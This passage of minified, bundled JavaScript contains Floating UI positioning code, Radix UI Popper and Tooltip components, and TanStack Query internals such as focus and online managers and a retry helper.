        o && g.addEventListener("scroll", n, { passive: !0 }), i && g.addEventListener("resize", n);
    });
    const p = u && a ? F2(u, n) : null;
    let m = -1,
        f = null;
    s &&
        ((f = new ResizeObserver((g) => {
            let [h] = g;
            h &&
                h.target === u &&
                f &&
                (f.unobserve(t),
                cancelAnimationFrame(m),
                (m = requestAnimationFrame(() => {
                    var v;
                    (v = f) == null || v.observe(t);
                }))),
                n();
        })),
        u && !c && f.observe(u),
        f.observe(t));
    let S,
        y = c ? jr(e) : null;
    c && w();
    function w() {
        const g = jr(e);
        y && !Vg(y, g) && n(), (y = g), (S = requestAnimationFrame(w));
    }
    return (
        n(),
        () => {
            var g;
            d.forEach((h) => {
                o && h.removeEventListener("scroll", n), i && h.removeEventListener("resize", n);
            }),
                p == null || p(),
                (g = f) == null || g.disconnect(),
                (f = null),
                c && cancelAnimationFrame(S);
        }
    );
}
const B2 = u2,
    U2 = d2,
    H2 = a2,
    $2 = f2,
    V2 = l2,
    Kp = s2,
    W2 = p2,
    K2 = (e, t, n) => {
        const r = new Map(),
            o = { platform: _2, ...n },
            i = { ...o.platform, _c: r };
        return i2(e, t, { ...o, platform: i });
    };
var G2 = typeof document < "u",
    Q2 = function () {},
    Ms = G2 ? x.useLayoutEffect : Q2;
function pa(e, t) {
    if (e === t) return !0;
    if (typeof e != typeof t) return !1;
    if (typeof e == "function" && e.toString() === t.toString()) return !0;
    let n, r, o;
    if (e && t && typeof e == "object") {
        if (Array.isArray(e)) {
            if (((n = e.length), n !== t.length)) return !1;
            for (r = n; r-- !== 0; ) if (!pa(e[r], t[r])) return !1;
            return !0;
        }
        if (((o = Object.keys(e)), (n = o.length), n !== Object.keys(t).length)) return !1;
        for (r = n; r-- !== 0; ) if (!{}.hasOwnProperty.call(t, o[r])) return !1;
        for (r = n; r-- !== 0; ) {
            const i = o[r];
            if (!(i === "_owner" && e.$$typeof) && !pa(e[i], t[i])) return !1;
        }
        return !0;
    }
    return e !== e && t !== t;
}
function Wg(e) {
    return typeof window > "u" ? 1 : (e.ownerDocument.defaultView || window).devicePixelRatio || 1;
}
function Gp(e, t) {
    const n = Wg(e);
    return Math.round(t * n) / n;
}
function Tl(e) {
    const t = x.useRef(e);
    return (
        Ms(() => {
            t.current = e;
        }),
        t
    );
}
function q2(e) {
    e === void 0 && (e = {});
    const {
            placement: t = "bottom",
            strategy: n = "absolute",
            middleware: r = [],
            platform: o,
            elements: { reference: i, floating: s } = {},
            transform: a = !0,
            whileElementsMounted: c,
            open: u,
        } = e,
        [d, p] = x.useState({ x: 0, y: 0, strategy: n, placement: t, middlewareData: {}, isPositioned: !1 }),
        [m, f] = x.useState(r);
    pa(m, r) || f(r);
    const [S, y] = x.useState(null),
        [w, g] = x.useState(null),
        h = x.useCallback((E) => {
            E !== C.current && ((C.current = E), y(E));
        }, []),
        v = x.useCallback((E) => {
            E !== P.current && ((P.current = E), g(E));
        }, []),
        b = i || S,
        k = s || w,
        C = x.useRef(null),
        P = x.useRef(null),
        A = x.useRef(d),
        L = c != null,
        M = Tl(c),
        U = Tl(o),
        F = Tl(u),
        G = x.useCallback(() => {
            if (!C.current || !P.current) return;
            const E = { placement: t, strategy: n, middleware: m };
            U.current && (E.platform = U.current),
                K2(C.current, P.current, E).then((T) => {
                    const _ = { ...T, isPositioned: F.current !== !1 };
                    O.current &&
                        !pa(A.current, _) &&
                        ((A.current = _),
                        _i.flushSync(() => {
                            p(_);
                        }));
                });
        }, [m, t, n, U, F]);
    Ms(() => {
        u === !1 && A.current.isPositioned && ((A.current.isPositioned = !1), p((E) => ({ ...E, isPositioned: !1 })));
    }, [u]);
    const O = x.useRef(!1);
    Ms(
        () => (
            (O.current = !0),
            () => {
                O.current = !1;
            }
        ),
        []
    ),
        Ms(() => {
            if ((b && (C.current = b), k && (P.current = k), b && k)) {
                if (M.current) return M.current(b, k, G);
                G();
            }
        }, [b, k, G, M, L]);
    const X = x.useMemo(() => ({ reference: C, floating: P, setReference: h, setFloating: v }), [h, v]),
        H = x.useMemo(() => ({ reference: b, floating: k }), [b, k]),
        $ = x.useMemo(() => {
            const E = { position: n, left: 0, top: 0 };
            if (!H.floating) return E;
            const T = Gp(H.floating, d.x),
                _ = Gp(H.floating, d.y);
            return a
                ? {
                      ...E,
                      transform: "translate(" + T + "px, " + _ + "px)",
                      ...(Wg(H.floating) >= 1.5 && { willChange: "transform" }),
                  }
                : { position: n, left: T, top: _ };
        }, [n, a, H.floating, d.x, d.y]);
    return x.useMemo(() => ({ ...d, update: G, refs: X, elements: H, floatingStyles: $ }), [d, G, X, H, $]);
}
const X2 = (e) => {
        function t(n) {
            return {}.hasOwnProperty.call(n, "current");
        }
        return {
            name: "arrow",
            options: e,
            fn(n) {
                const { element: r, padding: o } = typeof e == "function" ? e(n) : e;
                return r && t(r)
                    ? r.current != null
                        ? Kp({ element: r.current, padding: o }).fn(n)
                        : {}
                    : r
                      ? Kp({ element: r, padding: o }).fn(n)
                      : {};
            },
        };
    },
    Y2 = (e, t) => ({ ...B2(e), options: [e, t] }),
    Z2 = (e, t) => ({ ...U2(e), options: [e, t] }),
    J2 = (e, t) => ({ ...W2(e), options: [e, t] }),
    eS = (e, t) => ({ ...H2(e), options: [e, t] }),
    tS = (e, t) => ({ ...$2(e), options: [e, t] }),
    nS = (e, t) => ({ ...V2(e), options: [e, t] }),
    rS = (e, t) => ({ ...X2(e), options: [e, t] });
var oS = "Arrow",
    Kg = x.forwardRef((e, t) => {
        const { children: n, width: r = 10, height: o = 5, ...i } = e;
        return l.jsx(et.svg, {
            ...i,
            ref: t,
            width: r,
            height: o,
            viewBox: "0 0 30 10",
            preserveAspectRatio: "none",
            children: e.asChild ? n : l.jsx("polygon", { points: "0,0 30,0 15,10" }),
        });
    });
Kg.displayName = oS;
var iS = Kg;
function sS(e) {
    const [t, n] = x.useState(void 0);
    return (
        nr(() => {
            if (e) {
                n({ width: e.offsetWidth, height: e.offsetHeight });
                const r = new ResizeObserver((o) => {
                    if (!Array.isArray(o) || !o.length) return;
                    const i = o[0];
                    let s, a;
                    if ("borderBoxSize" in i) {
                        const c = i.borderBoxSize,
                            u = Array.isArray(c) ? c[0] : c;
                        (s = u.inlineSize), (a = u.blockSize);
                    } else (s = e.offsetWidth), (a = e.offsetHeight);
                    n({ width: s, height: a });
                });
                return r.observe(e, { box: "border-box" }), () => r.unobserve(e);
            } else n(void 0);
        }, [e]),
        t
    );
}
var Gg = "Popper",
    [Qg, qg] = Ma(Gg),
    [Tk, Xg] = Qg(Gg),
    Yg = "PopperAnchor",
    Zg = x.forwardRef((e, t) => {
        const { __scopePopper: n, virtualRef: r, ...o } = e,
            i = Xg(Yg, n),
            s = x.useRef(null),
            a = It(t, s);
        return (
            x.useEffect(() => {
                i.onAnchorChange((r == null ? void 0 : r.current) || s.current);
            }),
            r ? null : l.jsx(et.div, { ...o, ref: a })
        );
    });
Zg.displayName = Yg;
var nd = "PopperContent",
    [aS, lS] = Qg(nd),
    Jg = x.forwardRef((e, t) => {
        var te, Zt, Ot, Jt, re, en;
        const {
                __scopePopper: n,
                side: r = "bottom",
                sideOffset: o = 0,
                align: i = "center",
                alignOffset: s = 0,
                arrowPadding: a = 0,
                avoidCollisions: c = !0,
                collisionBoundary: u = [],
                collisionPadding: d = 0,
                sticky: p = "partial",
                hideWhenDetached: m = !1,
                updatePositionStrategy: f = "optimized",
                onPlaced: S,
                ...y
            } = e,
            w = Xg(nd, n),
            [g, h] = x.useState(null),
            v = It(t, (I) => h(I)),
            [b, k] = x.useState(null),
            C = sS(b),
            P = (C == null ? void 0 : C.width) ?? 0,
            A = (C == null ? void 0 : C.height) ?? 0,
            L = r + (i !== "center" ? "-" + i : ""),
            M = typeof d == "number" ? d : { top: 0, right: 0, bottom: 0, left: 0, ...d },
            U = Array.isArray(u) ? u : [u],
            F = U.length > 0,
            G = { padding: M, boundary: U.filter(uS), altBoundary: F },
            {
                refs: O,
                floatingStyles: X,
                placement: H,
                isPositioned: $,
                middlewareData: E,
            } = q2({
                strategy: "fixed",
                placement: L,
                whileElementsMounted: (...I) => z2(...I, { animationFrame: f === "always" }),
                elements: { reference: w.anchor },
                middleware: [
                    Y2({ mainAxis: o + A, alignmentAxis: s }),
                    c && Z2({ mainAxis: !0, crossAxis: !1, limiter: p === "partial" ? J2() : void 0, ...G }),
                    c && eS({ ...G }),
                    tS({
                        ...G,
                        apply: ({ elements: I, rects: Z, availableWidth: ge, availableHeight: ye }) => {
                            const { width: ut, height: Ie } = Z.reference,
                                Le = I.floating.style;
                            Le.setProperty("--radix-popper-available-width", `${ge}px`),
                                Le.setProperty("--radix-popper-available-height", `${ye}px`),
                                Le.setProperty("--radix-popper-anchor-width", `${ut}px`),
                                Le.setProperty("--radix-popper-anchor-height", `${Ie}px`);
                        },
                    }),
                    b && rS({ element: b, padding: a }),
                    dS({ arrowWidth: P, arrowHeight: A }),
                    m && nS({ strategy: "referenceHidden", ...G }),
                ],
            }),
            [T, _] = ny(H),
            V = tr(S);
        nr(() => {
            $ && (V == null || V());
        }, [$, V]);
        const B = (te = E.arrow) == null ? void 0 : te.x,
            q = (Zt = E.arrow) == null ? void 0 : Zt.y,
            Y = ((Ot = E.arrow) == null ? void 0 : Ot.centerOffset) !== 0,
            [he, Ne] = x.useState();
        return (
            nr(() => {
                g && Ne(window.getComputedStyle(g).zIndex);
            }, [g]),
            l.jsx("div", {
                ref: O.setFloating,
                "data-radix-popper-content-wrapper": "",
                style: {
                    ...X,
                    transform: $ ? X.transform : "translate(0, -200%)",
                    minWidth: "max-content",
                    zIndex: he,
                    "--radix-popper-transform-origin": [
                        (Jt = E.transformOrigin) == null ? void 0 : Jt.x,
                        (re = E.transformOrigin) == null ? void 0 : re.y,
                    ].join(" "),
                    ...(((en = E.hide) == null ? void 0 : en.referenceHidden) && {
                        visibility: "hidden",
                        pointerEvents: "none",
                    }),
                },
                dir: e.dir,
                children: l.jsx(aS, {
                    scope: n,
                    placedSide: T,
                    onArrowChange: k,
                    arrowX: B,
                    arrowY: q,
                    shouldHideArrow: Y,
                    children: l.jsx(et.div, {
                        "data-side": T,
                        "data-align": _,
                        ...y,
                        ref: v,
                        style: { ...y.style, animation: $ ? void 0 : "none" },
                    }),
                }),
            })
        );
    });
Jg.displayName = nd;
var ey = "PopperArrow",
    cS = { top: "bottom", right: "left", bottom: "top", left: "right" },
    ty = x.forwardRef(function (t, n) {
        const { __scopePopper: r, ...o } = t,
            i = lS(ey, r),
            s = cS[i.placedSide];
        return l.jsx("span", {
            ref: i.onArrowChange,
            style: {
                position: "absolute",
                left: i.arrowX,
                top: i.arrowY,
                [s]: 0,
                transformOrigin: { top: "", right: "0 0", bottom: "center 0", left: "100% 0" }[i.placedSide],
                transform: {
                    top: "translateY(100%)",
                    right: "translateY(50%) rotate(90deg) translateX(-50%)",
                    bottom: "rotate(180deg)",
                    left: "translateY(50%) rotate(-90deg) translateX(50%)",
                }[i.placedSide],
                visibility: i.shouldHideArrow ? "hidden" : void 0,
            },
            children: l.jsx(iS, { ...o, ref: n, style: { ...o.style, display: "block" } }),
        });
    });
ty.displayName = ey;
function uS(e) {
    return e !== null;
}
var dS = (e) => ({
    name: "transformOrigin",
    options: e,
    fn(t) {
        var w, g, h;
        const { placement: n, rects: r, middlewareData: o } = t,
            s = ((w = o.arrow) == null ? void 0 : w.centerOffset) !== 0,
            a = s ? 0 : e.arrowWidth,
            c = s ? 0 : e.arrowHeight,
            [u, d] = ny(n),
            p = { start: "0%", center: "50%", end: "100%" }[d],
            m = (((g = o.arrow) == null ? void 0 : g.x) ?? 0) + a / 2,
            f = (((h = o.arrow) == null ? void 0 : h.y) ?? 0) + c / 2;
        let S = "",
            y = "";
        return (
            u === "bottom"
                ? ((S = s ? p : `${m}px`), (y = `${-c}px`))
                : u === "top"
                  ? ((S = s ? p : `${m}px`), (y = `${r.floating.height + c}px`))
                  : u === "right"
                    ? ((S = `${-c}px`), (y = s ? p : `${f}px`))
                    : u === "left" && ((S = `${r.floating.width + c}px`), (y = s ? p : `${f}px`)),
            { data: { x: S, y } }
        );
    },
});
function ny(e) {
    const [t, n = "center"] = e.split("-");
    return [t, n];
}
var pS = Zg,
    fS = Jg,
    mS = ty,
    [za, Ak] = Ma("Tooltip", [qg]),
    rd = qg(),
    ry = "TooltipProvider",
    hS = 700,
    Qp = "tooltip.open",
    [gS, oy] = za(ry),
    iy = (e) => {
        const {
                __scopeTooltip: t,
                delayDuration: n = hS,
                skipDelayDuration: r = 300,
                disableHoverableContent: o = !1,
                children: i,
            } = e,
            s = x.useRef(!0),
            a = x.useRef(!1),
            c = x.useRef(0);
        return (
            x.useEffect(() => {
                const u = c.current;
                return () => window.clearTimeout(u);
            }, []),
            l.jsx(gS, {
                scope: t,
                isOpenDelayedRef: s,
                delayDuration: n,
                onOpen: x.useCallback(() => {
                    window.clearTimeout(c.current), (s.current = !1);
                }, []),
                onClose: x.useCallback(() => {
                    window.clearTimeout(c.current), (c.current = window.setTimeout(() => (s.current = !0), r));
                }, [r]),
                isPointerInTransitRef: a,
                onPointerInTransitChange: x.useCallback((u) => {
                    a.current = u;
                }, []),
                disableHoverableContent: o,
                children: i,
            })
        );
    };
iy.displayName = ry;
var sy = "Tooltip",
    [jk, Ba] = za(sy),
    Fc = "TooltipTrigger",
    yS = x.forwardRef((e, t) => {
        const { __scopeTooltip: n, ...r } = e,
            o = Ba(Fc, n),
            i = oy(Fc, n),
            s = rd(n),
            a = x.useRef(null),
            c = It(t, a, o.onTriggerChange),
            u = x.useRef(!1),
            d = x.useRef(!1),
            p = x.useCallback(() => (u.current = !1), []);
        return (
            x.useEffect(() => () => document.removeEventListener("pointerup", p), [p]),
            l.jsx(pS, {
                asChild: !0,
                ...s,
                children: l.jsx(et.button, {
                    "aria-describedby": o.open ? o.contentId : void 0,
                    "data-state": o.stateAttribute,
                    ...r,
                    ref: c,
                    onPointerMove: Pe(e.onPointerMove, (m) => {
                        m.pointerType !== "touch" &&
                            !d.current &&
                            !i.isPointerInTransitRef.current &&
                            (o.onTriggerEnter(), (d.current = !0));
                    }),
                    onPointerLeave: Pe(e.onPointerLeave, () => {
                        o.onTriggerLeave(), (d.current = !1);
                    }),
                    onPointerDown: Pe(e.onPointerDown, () => {
                        o.open && o.onClose(),
                            (u.current = !0),
                            document.addEventListener("pointerup", p, { once: !0 });
                    }),
                    onFocus: Pe(e.onFocus, () => {
                        u.current || o.onOpen();
                    }),
                    onBlur: Pe(e.onBlur, o.onClose),
                    onClick: Pe(e.onClick, o.onClose),
                }),
            })
        );
    });
yS.displayName = Fc;
var vS = "TooltipPortal",
    [Rk, xS] = za(vS, { forceMount: void 0 }),
    Po = "TooltipContent",
    ay = x.forwardRef((e, t) => {
        const n = xS(Po, e.__scopeTooltip),
            { forceMount: r = n.forceMount, side: o = "top", ...i } = e,
            s = Ba(Po, e.__scopeTooltip);
        return l.jsx(zu, {
            present: r || s.open,
            children: s.disableHoverableContent
                ? l.jsx(ly, { side: o, ...i, ref: t })
                : l.jsx(wS, { side: o, ...i, ref: t }),
        });
    }),
    wS = x.forwardRef((e, t) => {
        const n = Ba(Po, e.__scopeTooltip),
            r = oy(Po, e.__scopeTooltip),
            o = x.useRef(null),
            i = It(t, o),
            [s, a] = x.useState(null),
            { trigger: c, onClose: u } = n,
            d = o.current,
            { onPointerInTransitChange: p } = r,
            m = x.useCallback(() => {
                a(null), p(!1);
            }, [p]),
            f = x.useCallback(
                (S, y) => {
                    const w = S.currentTarget,
                        g = { x: S.clientX, y: S.clientY },
                        h = PS(g, w.getBoundingClientRect()),
                        v = ES(g, h),
                        b = NS(y.getBoundingClientRect()),
                        k = AS([...v, ...b]);
                    a(k), p(!0);
                },
                [p]
            );
        return (
            x.useEffect(() => () => m(), [m]),
            x.useEffect(() => {
                if (c && d) {
                    const S = (w) => f(w, d),
                        y = (w) => f(w, c);
                    return (
                        c.addEventListener("pointerleave", S),
                        d.addEventListener("pointerleave", y),
                        () => {
                            c.removeEventListener("pointerleave", S), d.removeEventListener("pointerleave", y);
                        }
                    );
                }
            }, [c, d, f, m]),
            x.useEffect(() => {
                if (s) {
                    const S = (y) => {
                        const w = y.target,
                            g = { x: y.clientX, y: y.clientY },
                            h = (c == null ? void 0 : c.contains(w)) || (d == null ? void 0 : d.contains(w)),
                            v = !TS(g, s);
                        h ? m() : v && (m(), u());
                    };
                    return (
                        document.addEventListener("pointermove", S),
                        () => document.removeEventListener("pointermove", S)
                    );
                }
            }, [c, d, s, u, m]),
            l.jsx(ly, { ...e, ref: i })
        );
    }),
    [SS, bS] = za(sy, { isInside: !1 }),
    kS = mv("TooltipContent"),
    ly = x.forwardRef((e, t) => {
        const {
                __scopeTooltip: n,
                children: r,
                "aria-label": o,
                onEscapeKeyDown: i,
                onPointerDownOutside: s,
                ...a
            } = e,
            c = Ba(Po, n),
            u = rd(n),
            { onClose: d } = c;
        return (
            x.useEffect(() => (document.addEventListener(Qp, d), () => document.removeEventListener(Qp, d)), [d]),
            x.useEffect(() => {
                if (c.trigger) {
                    const p = (m) => {
                        const f = m.target;
                        f != null && f.contains(c.trigger) && d();
                    };
                    return (
                        window.addEventListener("scroll", p, { capture: !0 }),
                        () => window.removeEventListener("scroll", p, { capture: !0 })
                    );
                }
            }, [c.trigger, d]),
            l.jsx(Fu, {
                asChild: !0,
                disableOutsidePointerEvents: !1,
                onEscapeKeyDown: i,
                onPointerDownOutside: s,
                onFocusOutside: (p) => p.preventDefault(),
                onDismiss: d,
                children: l.jsxs(fS, {
                    "data-state": c.stateAttribute,
                    ...u,
                    ...a,
                    ref: t,
                    style: {
                        ...a.style,
                        "--radix-tooltip-content-transform-origin": "var(--radix-popper-transform-origin)",
                        "--radix-tooltip-content-available-width": "var(--radix-popper-available-width)",
                        "--radix-tooltip-content-available-height": "var(--radix-popper-available-height)",
                        "--radix-tooltip-trigger-width": "var(--radix-popper-anchor-width)",
                        "--radix-tooltip-trigger-height": "var(--radix-popper-anchor-height)",
                    },
                    children: [
                        l.jsx(kS, { children: r }),
                        l.jsx(SS, {
                            scope: n,
                            isInside: !0,
                            children: l.jsx(zv, { id: c.contentId, role: "tooltip", children: o || r }),
                        }),
                    ],
                }),
            })
        );
    });
ay.displayName = Po;
var cy = "TooltipArrow",
    CS = x.forwardRef((e, t) => {
        const { __scopeTooltip: n, ...r } = e,
            o = rd(n);
        return bS(cy, n).isInside ? null : l.jsx(mS, { ...o, ...r, ref: t });
    });
CS.displayName = cy;
function PS(e, t) {
    const n = Math.abs(t.top - e.y),
        r = Math.abs(t.bottom - e.y),
        o = Math.abs(t.right - e.x),
        i = Math.abs(t.left - e.x);
    switch (Math.min(n, r, o, i)) {
        case i:
            return "left";
        case o:
            return "right";
        case n:
            return "top";
        case r:
            return "bottom";
        default:
            throw new Error("unreachable");
    }
}
function ES(e, t, n = 5) {
    const r = [];
    switch (t) {
        case "top":
            r.push({ x: e.x - n, y: e.y + n }, { x: e.x + n, y: e.y + n });
            break;
        case "bottom":
            r.push({ x: e.x - n, y: e.y - n }, { x: e.x + n, y: e.y - n });
            break;
        case "left":
            r.push({ x: e.x + n, y: e.y - n }, { x: e.x + n, y: e.y + n });
            break;
        case "right":
            r.push({ x: e.x - n, y: e.y - n }, { x: e.x - n, y: e.y + n });
            break;
    }
    return r;
}
function NS(e) {
    const { top: t, right: n, bottom: r, left: o } = e;
    return [
        { x: o, y: t },
        { x: n, y: t },
        { x: n, y: r },
        { x: o, y: r },
    ];
}
function TS(e, t) {
    const { x: n, y: r } = e;
    let o = !1;
    for (let i = 0, s = t.length - 1; i < t.length; s = i++) {
        const a = t[i],
            c = t[s],
            u = a.x,
            d = a.y,
            p = c.x,
            m = c.y;
        d > r != m > r && n < ((p - u) * (r - d)) / (m - d) + u && (o = !o);
    }
    return o;
}
function AS(e) {
    const t = e.slice();
    return t.sort((n, r) => (n.x < r.x ? -1 : n.x > r.x ? 1 : n.y < r.y ? -1 : n.y > r.y ? 1 : 0)), jS(t);
}
function jS(e) {
    if (e.length <= 1) return e.slice();
    const t = [];
    for (let r = 0; r < e.length; r++) {
        const o = e[r];
        for (; t.length >= 2; ) {
            const i = t[t.length - 1],
                s = t[t.length - 2];
            if ((i.x - s.x) * (o.y - s.y) >= (i.y - s.y) * (o.x - s.x)) t.pop();
            else break;
        }
        t.push(o);
    }
    t.pop();
    const n = [];
    for (let r = e.length - 1; r >= 0; r--) {
        const o = e[r];
        for (; n.length >= 2; ) {
            const i = n[n.length - 1],
                s = n[n.length - 2];
            if ((i.x - s.x) * (o.y - s.y) >= (i.y - s.y) * (o.x - s.x)) n.pop();
            else break;
        }
        n.push(o);
    }
    return n.pop(), t.length === 1 && n.length === 1 && t[0].x === n[0].x && t[0].y === n[0].y ? t : t.concat(n);
}
var RS = iy,
    uy = ay;
const MS = RS,
    IS = x.forwardRef(({ className: e, sideOffset: t = 4, ...n }, r) =>
        l.jsx(uy, {
            ref: r,
            sideOffset: t,
            className: Ir(
                "z-50 overflow-hidden rounded-md border bg-popover px-3 py-1.5 text-sm text-popover-foreground shadow-md animate-in fade-in-0 zoom-in-95 data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=closed]:zoom-out-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2",
                e
            ),
            ...n,
        })
    );
IS.displayName = uy.displayName;
var Ua = class {
        constructor() {
            (this.listeners = new Set()), (this.subscribe = this.subscribe.bind(this));
        }
        subscribe(e) {
            return (
                this.listeners.add(e),
                this.onSubscribe(),
                () => {
                    this.listeners.delete(e), this.onUnsubscribe();
                }
            );
        }
        hasListeners() {
            return this.listeners.size > 0;
        }
        onSubscribe() {}
        onUnsubscribe() {}
    },
    Ha = typeof window > "u" || "Deno" in globalThis;
function Pt() {}
function LS(e, t) {
    return typeof e == "function" ? e(t) : e;
}
function DS(e) {
    return typeof e == "number" && e >= 0 && e !== 1 / 0;
}
function OS(e, t) {
    return Math.max(e + (t || 0) - Date.now(), 0);
}
function zc(e, t) {
    return typeof e == "function" ? e(t) : e;
}
function _S(e, t) {
    return typeof e == "function" ? e(t) : e;
}
function qp(e, t) {
    const { type: n = "all", exact: r, fetchStatus: o, predicate: i, queryKey: s, stale: a } = e;
    if (s) {
        if (r) {
            if (t.queryHash !== od(s, t.options)) return !1;
        } else if (!Ni(t.queryKey, s)) return !1;
    }
    if (n !== "all") {
        const c = t.isActive();
        if ((n === "active" && !c) || (n === "inactive" && c)) return !1;
    }
    return !((typeof a == "boolean" && t.isStale() !== a) || (o && o !== t.state.fetchStatus) || (i && !i(t)));
}
function Xp(e, t) {
    const { exact: n, status: r, predicate: o, mutationKey: i } = e;
    if (i) {
        if (!t.options.mutationKey) return !1;
        if (n) {
            if (Ei(t.options.mutationKey) !== Ei(i)) return !1;
        } else if (!Ni(t.options.mutationKey, i)) return !1;
    }
    return !((r && t.state.status !== r) || (o && !o(t)));
}
function od(e, t) {
    return ((t == null ? void 0 : t.queryKeyHashFn) || Ei)(e);
}
function Ei(e) {
    return JSON.stringify(e, (t, n) =>
        Bc(n)
            ? Object.keys(n)
                  .sort()
                  .reduce((r, o) => ((r[o] = n[o]), r), {})
            : n
    );
}
function Ni(e, t) {
    return e === t
        ? !0
        : typeof e != typeof t
          ? !1
          : e && t && typeof e == "object" && typeof t == "object"
            ? Object.keys(t).every((n) => Ni(e[n], t[n]))
            : !1;
}
function dy(e, t) {
    if (e === t) return e;
    const n = Yp(e) && Yp(t);
    if (n || (Bc(e) && Bc(t))) {
        const r = n ? e : Object.keys(e),
            o = r.length,
            i = n ? t : Object.keys(t),
            s = i.length,
            a = n ? [] : {},
            c = new Set(r);
        let u = 0;
        for (let d = 0; d < s; d++) {
            const p = n ? d : i[d];
            ((!n && c.has(p)) || n) && e[p] === void 0 && t[p] === void 0
                ? ((a[p] = void 0), u++)
                : ((a[p] = dy(e[p], t[p])), a[p] === e[p] && e[p] !== void 0 && u++);
        }
        return o === s && u === o ? e : a;
    }
    return t;
}
function Yp(e) {
    return Array.isArray(e) && e.length === Object.keys(e).length;
}
function Bc(e) {
    if (!Zp(e)) return !1;
    const t = e.constructor;
    if (t === void 0) return !0;
    const n = t.prototype;
    return !(!Zp(n) || !n.hasOwnProperty("isPrototypeOf") || Object.getPrototypeOf(e) !== Object.prototype);
}
function Zp(e) {
    return Object.prototype.toString.call(e) === "[object Object]";
}
function FS(e) {
    return new Promise((t) => {
        setTimeout(t, e);
    });
}
function zS(e, t, n) {
    return typeof n.structuralSharing == "function"
        ? n.structuralSharing(e, t)
        : n.structuralSharing !== !1
          ? dy(e, t)
          : t;
}
function BS(e, t, n = 0) {
    const r = [...e, t];
    return n && r.length > n ? r.slice(1) : r;
}
function US(e, t, n = 0) {
    const r = [t, ...e];
    return n && r.length > n ? r.slice(0, -1) : r;
}
var id = Symbol();
function py(e, t) {
    return !e.queryFn && t != null && t.initialPromise
        ? () => t.initialPromise
        : !e.queryFn || e.queryFn === id
          ? () => Promise.reject(new Error(`Missing queryFn: '${e.queryHash}'`))
          : e.queryFn;
}
var mr,
    On,
    lo,
    pf,
    HS =
        ((pf = class extends Ua {
            constructor() {
                super();
                ne(this, mr);
                ne(this, On);
                ne(this, lo);
                K(this, lo, (t) => {
                    if (!Ha && window.addEventListener) {
                        const n = () => t();
                        return (
                            window.addEventListener("visibilitychange", n, !1),
                            () => {
                                window.removeEventListener("visibilitychange", n);
                            }
                        );
                    }
                });
            }
            onSubscribe() {
                N(this, On) || this.setEventListener(N(this, lo));
            }
            onUnsubscribe() {
                var t;
                this.hasListeners() || ((t = N(this, On)) == null || t.call(this), K(this, On, void 0));
            }
            setEventListener(t) {
                var n;
                K(this, lo, t),
                    (n = N(this, On)) == null || n.call(this),
                    K(
                        this,
                        On,
                        t((r) => {
                            typeof r == "boolean" ? this.setFocused(r) : this.onFocus();
                        })
                    );
            }
            setFocused(t) {
                N(this, mr) !== t && (K(this, mr, t), this.onFocus());
            }
            onFocus() {
                const t = this.isFocused();
                this.listeners.forEach((n) => {
                    n(t);
                });
            }
            isFocused() {
                var t;
                return typeof N(this, mr) == "boolean"
                    ? N(this, mr)
                    : ((t = globalThis.document) == null ? void 0 : t.visibilityState) !== "hidden";
            }
        }),
        (mr = new WeakMap()),
        (On = new WeakMap()),
        (lo = new WeakMap()),
        pf),
    fy = new HS(),
    co,
    _n,
    uo,
    ff,
    $S =
        ((ff = class extends Ua {
            constructor() {
                super();
                ne(this, co, !0);
                ne(this, _n);
                ne(this, uo);
                K(this, uo, (t) => {
                    if (!Ha && window.addEventListener) {
                        const n = () => t(!0),
                            r = () => t(!1);
                        return (
                            window.addEventListener("online", n, !1),
                            window.addEventListener("offline", r, !1),
                            () => {
                                window.removeEventListener("online", n), window.removeEventListener("offline", r);
                            }
                        );
                    }
                });
            }
            onSubscribe() {
                N(this, _n) || this.setEventListener(N(this, uo));
            }
            onUnsubscribe() {
                var t;
                this.hasListeners() || ((t = N(this, _n)) == null || t.call(this), K(this, _n, void 0));
            }
            setEventListener(t) {
                var n;
                K(this, uo, t), (n = N(this, _n)) == null || n.call(this), K(this, _n, t(this.setOnline.bind(this)));
            }
            setOnline(t) {
                N(this, co) !== t &&
                    (K(this, co, t),
                    this.listeners.forEach((r) => {
                        r(t);
                    }));
            }
            isOnline() {
                return N(this, co);
            }
        }),
        (co = new WeakMap()),
        (_n = new WeakMap()),
        (uo = new WeakMap()),
        ff),
    fa = new $S();
function VS() {
    let e, t;
    const n = new Promise((o, i) => {
        (e = o), (t = i);
    });
    (n.status = "pending"), n.catch(() => {});
    function r(o) {
        Object.assign(n, o), delete n.resolve, delete n.reject;
    }
    return (
        (n.resolve = (o) => {
            r({ status: "fulfilled", value: o }), e(o);
        }),
        (n.reject = (o) => {
            r({ status: "rejected", reason: o }), t(o);
        }),
        n
    );
}
function WS(e) {
    return Math.min(1e3 * 2 ** e, 3e4);
}
function my(e) {
    return (e ?? "online") === "online" ? fa.isOnline() : !0;
}
var hy = class extends Error {
    constructor(e) {
        super("CancelledError"),
            (this.revert = e == null ? void 0 : e.revert),
            (this.silent = e == null ? void 0 : e.silent);
    }
};
function Al(e) {
    return e instanceof hy;
}
function gy(e) {
    let t = !1,
        n = 0,
        r = !1,
        o;
    const i = VS(),
        s = (y) => {
            var w;
            r || (m(new hy(y)), (w = e.abort) == null || w.call(e));
        },
        a = () => {
            t = !0;
        },
        c = () => {
            t = !1;
        },
        u = () => fy.isFocused() && (e.networkMode === "always" || fa.isOnline()) && e.canRun(),
        d = () => my(e.networkMode) && e.canRun(),
        p = (y) => {
            var w;
            r || ((r = !0), (w = e.onSuccess) == null || w.call(e, y), o == null || o(), i.resolve(y));
        },
        m = (y) => {
            var w;
            r || ((r = !0), (w = e.onError) == null || w.call(e, y), o == null || o(), i.reject(y));
        },
        f = () =>
            new Promise((y) => {
                var w;
                (o = (g) => {
                    (r || u()) && y(g);
                }),
                    (w = e.onPause) == null || w.call(e);
            }).then(() => {
                var y;
                (o = void 0), r || (y = e.onContinue) == null || y.call(e);
            }),
        S = () => {
            if (r) return;
            let y;
            const w = n === 0 ? e.initialPromise : void 0;
            try {
                y = w ?? e.fn();
            } catch (g) {
                y = Promise.reject(g);
            }
            Promise.resolve(y)
                .then(p)
                .catch((g) => {
                    var C;
                    if (r) return;
                    const h = e.retry ?? (Ha ? 0 : 3),
                        v = e.retryDelay ?? WS,
                        b = typeof v == "function" ? v(n, g) : v,
                        k = h === !0 || (typeof h == "number" && n < h) || (typeof h == "function" && h(n, g));
                    if (t || !k) {
                        m(g);
                        return;
                    }
                    n++,
                        (C = e.onFail) == null || C.call(e, n, g),
